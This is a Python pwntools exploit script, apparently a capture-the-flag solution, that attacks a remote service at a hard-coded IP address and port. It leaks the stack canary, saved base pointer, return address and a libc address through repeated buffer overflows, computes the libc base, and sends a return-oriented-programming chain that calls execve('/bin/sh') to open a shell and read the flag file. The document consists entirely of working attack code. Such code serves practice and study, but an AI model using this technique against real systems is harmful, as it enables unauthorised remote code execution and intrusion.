from pwn import *

conn = remote('140.113.207.245', 30176)
conn.recvuntil(b'Input something awesome: ')

# leak canary and rbp
payload = b'A' * 24 + b'\x01'
conn.send(payload)
leak = conn.recvuntil(b'Input: ')
canary = b'\x00' + leak[37:44]
rbp = leak[44:50].ljust(8, b'\x00')
# print(f'canary: {canary}')
payload = b'A' * 24 + b'\x00' # fill back \x00 to prevent segfault
conn.send(payload)

# leak return address
conn.recvuntil(b'Input something awesome: ')
payload = b'A' * 40
conn.send(payload)
leak = conn.recvuntil(b'Input: ')
ret_addr = leak[52:58].ljust(8, b'\x00')
# print(f'return addr: {ret_addr}')
payload = b'A' * 24 + p64(u64(canary)) + p64(u64(rbp))
conn.send(payload)

# leak libc function to calculate libc base
conn.recvuntil(b'Input something awesome: ')
payload = b'A' * 72
conn.send(payload)
leak = conn.recvuntil(b'Input: ')
libc_start_call_122 = leak[84:90].ljust(8, b'\x00')
# print(f'libc_start_call_122: {libc_start_call_122}')
payload = b'A' * 24 + p64(u64(canary)) + p64(u64(rbp)) + p64(u64(ret_addr)) + p64(u64(rbp)) + p64(u64(canary)) + p64(u64(rbp)) # change to leak every single addr
conn.send(payload)

libc_base = u64(libc_start_call_122) - 122 - 0x2a150 # 0x2a200 # adjust through gdb
# print(f'libc_base: {hex(libc_base)}')
# print(f'system addr: {hex(system_addr)}')
# print(f'binsh addr: {hex(binsh_addr)}')
# print(f'gadget_pop_rdi_ret: {hex(gadget_pop_rdi_ret)}')

pop_rdi_ret = libc_base + 0x10f75b
pop_rsi_ret = libc_base + 0x110a4d
pop_rbx_ret = libc_base + 0x586e4
mov_rdx_rbx_gadget = libc_base + 0xb0133
pop_rax_ret = libc_base + 0xdd237
syscall_gadget = libc_base + 0x288b5
binsh_addr = libc_base + 0x1cb42f

payload = b"A" * 24
payload += p64(u64(canary))
payload += p64(u64(rbp))
payload += p64(pop_rdi_ret) # return address starts here
payload += p64(binsh_addr) # set rdi = "/bin/sh"
payload += p64(pop_rsi_ret)
payload += p64(0) # set rsi = 0
payload += p64(pop_rbx_ret)
payload += p64(0) # set rbx = 0
payload += p64(mov_rdx_rbx_gadget) # mov rdx, rbx; pop rbx; pop r12; pop rbp; ret
payload += p64(0)  # pop rbx
payload += p64(0)  # pop r12
payload += p64(0)  # pop rbp
payload += p64(pop_rax_ret)
payload += p64(59) # set rax = 59
payload += p64(syscall_gadget) # syscall

conn.recvuntil(b'Input something awesome: ')
conn.send(payload)
conn.recvuntil(b'Input: ')
conn.send(b'aaa') # second input of this round, send anything to skip
conn.sendline(b'cat flag.txt')
conn.interactive()